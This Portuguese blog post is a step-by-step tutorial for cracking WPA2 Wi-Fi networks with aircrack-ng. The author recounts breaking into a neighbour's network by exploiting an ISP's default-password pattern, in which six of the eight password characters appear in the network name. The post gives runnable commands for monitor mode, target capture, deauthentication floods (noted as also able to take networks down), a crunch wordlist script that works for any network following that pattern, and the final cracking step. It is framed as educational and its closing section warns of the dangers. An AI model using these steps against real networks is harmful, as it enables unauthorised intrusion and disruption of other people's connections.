---
title: Invadindo rede wifi na prática
description: Mostrando como hackeei a rede wifi de uma vizinha da minha mãe
tags: ["Wifi Hacking", "Shell Script", "Brute Force"]
categories: ["SecLab", "Way Of Security"]
pin: true
draft: true
date: 2023-08-25 08:19:12 +02:00
author: matheus
---

# Hackeando redes sem fio na prática

Neste artigo vou mostrar para vocês como funciona na prática a invasão de uma rede wireless, e como foi minhas primeiras experiências hackeando redes wifi reais.

É ideal que você já saiba o básico de redes wireless, como funcionam os protocolos e conceitos, pois eles não serão explicados aprofundadamente nesta publicação. Futuramente, teremos em breve uma postagem específica que correrá por toda essa base de forma detalhada, porém explicaremos sobre alguns conceitos básicos por aqui para entendimento geral - por exemplo, como funciona a conexão em uma wifi.

### O que esperar desta publicação

Nesta postagem será esperado algumas explicações mais _práticas_ - com as ferramentas utilizadas no processo, por ter foco prático de uma **invasão em redes wireless** alheias utilizando pacote **Aircrakc-ng**, enquanto mostro *como foi a minha experiência descobrindo uma falha nas credenciais padrões de roteadores de uma grande operadora*, que me permitia **descobrir e ter acesso a qualquer rede que não tivesse alterado as credencias padrões**. Então, para mostrar como vi essa falha e explorei ela, estarei mostrando como um ataque a rede wireless funciona na prática também.

>*Vale já esclarecer que o intuito deste tópico é totalmente educativo e não me responsabilizo por nenhum ato de terceiro.* 


# Como pude invadir a rede da minha vizinha

> *Deixo* claro *também que, apesar dos pesares, nenhum ato de intenção malígna foi feito e a* operadora *em questão já atualizou sua forma de padronização de credenciais. Por este motivo resolvi repostar sobre esta falha protocolar, visto que muitos usuários ainda podem estar utilizando e ficando vulneráveis e precisam se atentar a isso.*

## Contextualização
Ambientificação de wifi hacking na prática & achando vulnerabilidade em redes wireless de uma operadora famosa.

### Detectando erro uma grande operadora.

 Em uma experiência passada, descobri uma vulnerabilidade significativa em uma grande operadora de internet. Eles estavam usando um modelo padrão de credencial fraco para suas redes Wi-Fi. A consistência desse padrão tornou-se aparente ao observar os modems da mesma operadora em várias residências de familiares.

 Para explorar essa falha, desenvolvi um script que gerava uma wordlist perfeita para esse padrão específico. Com o tempo fui fazendo um com o pacote aircrack junto. O resultado foi surpreendente - uma taxa de sucesso de 100% em todos os testes feitos, inclusive um deles sendo no modem de uma vizinha. No entanto, um tempo após a divulgação do projeto no github, a operadora solicitou sua remoção, principalmente devido à exposição indesejada que acabou rolando por vacilo meu. Tudo isso será melhor explorado mais a frente, tendo aqui apenas o contexto por trás.

 Felizmente, essa história tem um final positivo. Acredito que a operadora reconheceu a falha e melhorou, pois seu padrão de credenciais foi atualizado nos meus modems atuais, aumentando a segurança para seus usuários até certo ponto. Isso destaca a importância da segurança cibernética e da constante evolução para proteger contra ameaças emergentes. Se não sabe quais riscos sua rede invadida te trás, fiz um post sobre isso.

### Pincelada geral na conexão wireless

 Imagine a conexão de uma wifi como uma conversa animada em uma festa. Seu dispositivo é como um convidado procurando alguém para conversar e/ou dançar. Ele pode simplesmente começar a “gritar” no espaço, perguntando: *“Tem alguém de bobeira aí?”*. Isso é semelhante ao seu dispositivo procurando por redes Wi-Fi disponíveis.

 Quando um roteador Wi-Fi, que podemos pensar como outro convidado na festa, ouve o chamado, ele pode responder: “Eu! Meu nome é *‘Rede KLANU_2G1Z672U’*”. Agora, seu dispositivo sabe com quem pode “conversar” (ou dançar, rs), que são os que responderam, podendo escolher agora a rede com a qual deseja se conectar.

 Em seguida, seu dispositivo se aproxima do roteador e diz: “Oi, eu sou o *‘DispositivoA’*, posso conversar/dançar com você?”. Sendo uma resposta positiva, acaba se equivalendo a quando você coloca a senha correta. Em outras palavras, isso é semelhante a quando você insere a senha da rede Wi-Fi, pois se a senha estiver correta, o roteador reconhece seu dispositivo como um “convidado” confiável e permite que ele “entre na conversa” ou aceite o pedido de dança. Quando isso acontece e a pessoa é reconhecida, eles apertam as mãos e isso é o que chamamos de “handshake”.
 
 Podendo ser mais esclarecedor uma senha no exemplo da situação, imagine que o evento aconteça dentro de uma região barra pesada e que neste evento existem vários grupos fechados em que apenas pessoas verificadas e confiáveis entram. Cada grupo tem uma identificação própria - como uma tatuágem específica -, como um código secreto de detecção de membros. O *‘DispositivoA’*, assim que ele percebeu que a *‘Rede KLANU_2G1Z672U’* estava disponível para dançar ou conversar, precisaria ter esta tatuagem para que ela aceitasse dançar com ele, já que só assim ela saberia que ele era confiável e não de um grupo rival. E de praste, *todos fazem aperto de mão específico do grupo para começar*.

 Uma vez que a “conversa” foi estabelecida, seu dispositivo e o roteador podem começar a trocar informações. Eles tendo uma longa e animada conversa na festa é basicamente como navegar na internet, assistir a vídeos, enviar e-mails, etc.

 Essa “conversa” acontece através de ondas de rádio, que são como as palavras que usamos para conversar. Assim como podemos ouvir várias conversas em uma festa, seu dispositivo pode detectar várias redes ao mesmo tempo. Mas ele só pode “conversar” de verdade com uma rede de cada vez, assim como você só pode ter uma conversa de cada vez.

 > Quando você termina de usar a internet, é como se seu dispositivo estivesse se despedindo e saindo da festa. O roteador nota que seu dispositivo “saiu da conversa” e encerra a conexão. Lembre-se, tudo isso acontece em milésimos de segundo. 

### Pincelada sobre wifi hacking em geral

 O hacking de Wi-Fi é um tópico complexo que envolve uma compreensão profunda das redes sem fio e dos protocolos de segurança. Acho importante resumir ao menos os conceitos-chave.

 **Interface de Rede** é o ponto de conexão entre o dispositivo e a rede. No contexto do Wi-Fi, a interface de rede sem fio permite que o dispositivo se conecte a redes Wi-Fi.

 O **monitoramento** é o processo de observar e registrar a atividade em uma rede. No hacking de Wi-Fi, isso geralmente envolve colocar a interface de rede sem fio em “modo de monitoramento” para capturar o tráfego de rede.

 **Desautenticação** *(Deauth)* é um tipo de ataque que interrompe a conexão entre um dispositivo e a rede Wi-Fi (ou de uma rede inteira). Isso é feito enviando pacotes de desautenticação para o dispositivo e o ponto de acesso (AP), fazendo com que o dispositivo se desconecte. Quando um usuário é autêntico de uma rede, ao ser forçadamente dissociado (como por exemplo sair do alcance da rede) ele pode se associar automaticamente sem precisar recolocar a senha. Assim temos o processo de Auth e DeAuth. Ao forçar um DeAuth em alguém, ela de autenticará novamente e será possível capturar o aperto de mão deles para um atacante. O atacante também pode manter o usuário ou rede sem funcionar com ataques de DeAuth sem parar.

 O **handshake** é o processo de estabelecer uma conexão segura entre o dispositivo e o ponto de acesso, durante ela que eles trocam informações de autenticação. Capturar o handshake é um passo crucial no hacking de Wi-Fi, pois ele contém a “prova” criptografada da senha da rede.
 Contextualizando mais sobre os nossos exemplos, para que tenha sentido sair testando várias senhas até acertar, o usuário saber o *"aperto de mão específico do grupo"* acaba sendo de extrema importância, pois pode parecer que você apenas esqueceu ou é novo no grupo.

 A **força bruta** *(Brute Force)* é um método de descobrir a senha de uma rede através da tentativa e erro. Isso envolve testar todas as combinações possíveis de senhas até encontrar a correta. No contexto do hacking de Wi-Fi, a força bruta é geralmente usada para decifrar a senha a partir do handshake capturado e uma lista de possíveis senhas/combinações.
    

 - *Agora, mãos a obra*

> Todo o processo foi feito dentro de um mesmo diretório

# Fase de Reconhecimento

 A fase de reconhecimento acaba sendo muito de ficar monitorando as redes alheias, seus comportamentos, possíveis vulnerabilidades aparente e anotando as informações dos alvos.

 `Recon` é um passo crucial em hacking, e não seria diferente quando se fala em invasão de redes sem fio. ÉJá que é nessa etapa que os invasores coletam informações sobre a rede que desejam invadir. Isso pode incluir a identificação de redes disponíveis - como bssid (endereço fisico) e o canal de atuação -, a determinação do tipo de criptografia usada - como WPA2-PSK - e/ou até identificação de possíveis alvos vulneráves.

 Um exemplo interessante de possíveis alvos vulneráveis envolve aquela minha análise das credenciais usadas em certos modems de uma empresa, q é o q explocaremos aqui neste artigo. Observei que os nomes das redes seguiam um padrão com caracteres aleatórios ao final. As senhas sempre tinham 8 dígitos com 6 deles sendo exibidos nessa parte final do essid (nome da rede).  Em outras palavras, o início do nome da rede era sempre igual, mudando o que vinha após do 2G (ou 5G), o que também fazia com que o nome da rede sempre tivesse também o mesmo número de caractere. Além disso, esses dígitos aleatórios eram sempre uma combinação de letras maiúsculas e números, apenas. Assim como no nosso exemplo fictício:  `KLANU_2G1Z672U`
 
 Foi assim que veio crescendo a ideia de tentar criar um script que faz a wordlist perfeita para essas redes, apenas como teste, até porque o trabalho de uma wordlist grande e ficaz já foi reduzido sozinho. De uma determinada forma, a identificação do padrão de login/senha da rede faz parte de uma análise de reconhecimento também, acredito eu. Neste documento não apenas teremos o "passo a passo", como também mostraremos uma criação de shellscript para fazer a wordlist de qualquer rede vulnerável.


### Arquivo de informações
 Criando documento para salvar informação útil dos alvos

```bash
nano < nome >
```
`Exemplo: nano infos`

### Identificar sua interface de rede

```bash
iwconfig
```
Anotar sobre a interface no documento

### Ativar modo de monitoramento

```bash
sudo airmon-ng start < interface >
```
`Exemplo: sudo airmon-ng start wlp1s0` -> resultando na interface em modo mon: `wlp1s0mon` 
 O resultado pode ser verificado ao rodar o comando `iwconfig` novamente.

 Utilize o "**stop**" para desativar, além de pode utilizar o comando com "**status**" para verificar se está ativado ou desativado. 
 > Lembre-se de que o modo de monitoramento te desconecta da sua rede.

### Monitorar redes wi-fi próximas

```bash
sudo airodump-ng < interfacemon >
```
`Exemplo: sudo airodump-ng wlp1s0mon`

 Não esquecer de anotar as informações adquiridas nesta parte no seu documento, como ESSID (nome da rede), BSSID (endereço mac/físico) e o CH (canal).

### Monitoramento do alvo

 Nesta etapa, o monitoramento será específico para uma rede alvo com a captura dos arquivos '.cap'.

```bash
sudo airodump-ng --bssid < mac > -c < CH > -w < nome > < interfacemon >
```

ou

```bash
sudo airodump-ng --essid < wifi > -c < CH > -w < nome > < interfacemon >
```

ou

```bash
sudo airodump-ng --essid < nomeWiFi > -w < nomeArquivo > < interfacemon >
```

`Exemplo: sudo airodump-ng --essid KLANU_2G1Z672U -c 1 -w APtura wlan0mon`

 Recomendado ser mais específico, por exemplo, deixar claro o canal de funcionamento e o endereço físico. 
 
 Agora a tabela de monitoramento vai ser apenas na rede especificada, como poderá ser visto na tabela de cima, e com a tabela de baixo mostrando os dispositivos que se comunicam com esta rede. 
 
 > Agora pode existir algum tipo de ataque direto em um usuário de uma rede, por exemplo para ser desconectado, ou numa rede inteira que afetaria todos os conectados nela.
 
 **Importante** não esquecer de colocar as informações, como o BSSID do(s) alvo(s), no documento e **abrir uma sessão/aba no terminal para a próxima etapa**.


# Fase de Testes de Invasão e Exploração

 Nem todas as redes vão seguir os padrões de credenciais que estamos trabalhando nesta publicação, até porque a empresa que utilizava esta regra já alterou para uma mais forte. Porém, ainda podemos ter pessoas q usam um padrão aproximado e vamos explorar isso nesta etapa. Vamos precisar reforçar uma comunicação com algum dispositivo dentro da rede alvo, para capturarmos o 'handshake' de autenticação. Assim, vamos poder testar nossa wordlist e concluir com o ataque, podendo ser feito várias vezes com várias wordlists caso não siga este padrão, mas sim outro. Alguns podem ter wordlists que salvam várias senhas que era padrões de modem para ir testando, o que não garante nada mas que pode ser feito.
 
 Pode ser que o ataque de dissociação de algum usuário - para forçar reconexão - não funciona tão bem, sendo necessário fazer em outro dispositivo da rede ou até na rede inteira. Este ataque consiste em mandar diversos pacotes de DeAuth para a rede ou o alvo específico, poderemos ditar a quantidade de pacotes que iremos enviar. Assim, podemos também mandar uma quantidade absurda para derrubar a rede por um tempo - e isso apenas tendo alcance a rede.

 Após a captura do handshake e com a wordlist pronta, podemos fazer os testes das senhas que temos em mãos. Bastaria agora testar até achar.

> Ainda com terminal aberto no monitoramento...

### Ataque de desautenticação de usuário(s)

```bash
sudo aireplay-ng --deauth < númeroPacotes > -a < bssidAlvo > < interfacemon >
```
 Usando `aireplay` enquanto roda o monitoramento dessa rede em outra sessão do terminal / em segundo plano, pode ser visto o alvo sendo desconectado, sendo forçado a se reconectar e a **captura do handshake**. Quando a captura ocorrer, então o processo foi finalizado.

 Uma vez que a captura do handshake foi feita e já tem a wordlist em mãos, basta partir pro abraço, mas nesse caso mostraremos como foi a nossa criação e automatização na criação da nossa lista de senhas para qualquer rede que siga a mesma regra.
 

### Criação da wordlist para o padrão observado

 O comando que usamos para criar uma wordlist específica foi:

```bash
crunch 8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 -t @@PADRAO -o nomeWL
```
 Usamos o crunch para criar um arquivo em que cada palavra-chave possui tamanho único de 8 (mínimo e máximo), utilizando análise combinatória para uso de todo o alfabeto maiúsculo e números onde estão posicionados os arrobas `@@`, que indica ser apenas duas combinações de caracteres.

 Rede alvo com padrão vulnerável -> essid: `KLANU_2G1Z672U` -> os 6 últimos dígitos também são os últimos 6 da senha (de 8 dígitos) -> 5G672U
 > padrão de exemplo: KLANU_2G1Z672U:xx5G672U para descobrirmos o valor de `xx`

 `Exemplo: crunch 8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 -t @@5G672U -o wl`

> É possível reconhecer que é fácil de automatizar isso em shell script, né? bem fácil... tendo em vista que o código padrão q é usado no nome e na senha nunca será o mesmo da de outra rede, então precisamos fazer o script funcionar de acordo com o nome da rede fornecida.

#### Automatizando a criação da wordlist

 Fazendo a wordlist perfeita para as redes que seguem a mesma ideia.

 Queremos salvar a informação passada pelo usuário, que seria o nome da rede, e salvar os ultimos 6 dígitos em um arquivo para utilizarmos este conteúdo no crunch, que como vimos anteriormente, apenas precisa combinar dois caracteres aleatórios (compostos por letra maiúscula e/ou números) seguido do q foi gravado no arquivo. Assim, o script funciona para criar wordlist de qualquer rede que se encaixe nesse padrão frágil de acesso.

```sh
#!/bin/bash
read -p "Digite o nome da rede alvo (essid): " essid
echo $essid | cut -d "G" -f 2 > wifi.txt && crunch 8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 -t @@$(cat wifi.txt) -o wl &>/dev/null && rm wifi.txt
sleep 0.35s
echo "Wordlist criada com sucesso!"
sleep 0.2s
echo "Arquivo salvo como wl"
```

 Ao abrir o script (`chmod +x < nome do script >` + `./< nome do script >`) e digitar o nome da rede alvo, ele te retornará o arquivo `wl` feito.
 Agora podemos passar para a real fase de exploração, uma vez que já temos uma wordlist pronta para o uso.

### Quebrando a senha da rede sem fio alvo

 Com tudo pronto podemos partir pro ataque com o aircrack.

```bash
sudo aircrack-ng -a2 -e < "ESSID_Rede" > < "NomeArquivoCap*" > -w < wordlist >
```
 Resultado de exemplo da rede KLANU_2G1Z672U -> Key Found! [325G672U]
    
> Não esquecer de dar o `airmon-ng stop wlp1s0mon` posteriormente, para ter acesso a internet.

 - [x] KLANU_2G1Z672U:325G672U [ESSID:PASSWD]


# Fase de pós-exploração de uma situação real (alerta de perígo)
 Nessa etapa temos os reais problemas de alguém dentro de um ambiente restrito. Imagine que temos um espião de uma empresa rival dentro da sala de reunião da sua empresa? ouvindo e gravando tudo? ou pior, se está fazendo parte de uma reunião de emergência da sua empresa que você não está presente, e faz parecer que você o colocou como uma peça importante para ditar como certas coisas serão feitas... pois é, seria um desastre, né?

 Uma pessoa na sua rede wifi pode estar entre sua conexão e a do roteador, pode estar entre sua conexão e a de algum servidor, pode até mesmo fazer modificação no DNS local para alterar a página oficial de uma rede social para uma página fake dele (isto é, fazer com que o endereço original 'twitter.com' / ou 'x.com' seja redirecionado para a página falsa dele).

  São, em geral, problemas que você poderá sofrer ao utilizar redes wifi públicas alheias. O atacante pode se tornar o 'homem no meio' de toda a comunicação e isso pode ser bem prejudicial. Além de poder acessar bizarrices na sua rede privada. 
  
  Se quiser saber mais sobre os perigos de uma invasão a uma rede wifi, tenho uma publicação feita exclusivamente sobre isso e também dando dicas de como se proteger. [WayOfSec: Perigos de uma rede wireless](../perigos-wifi)
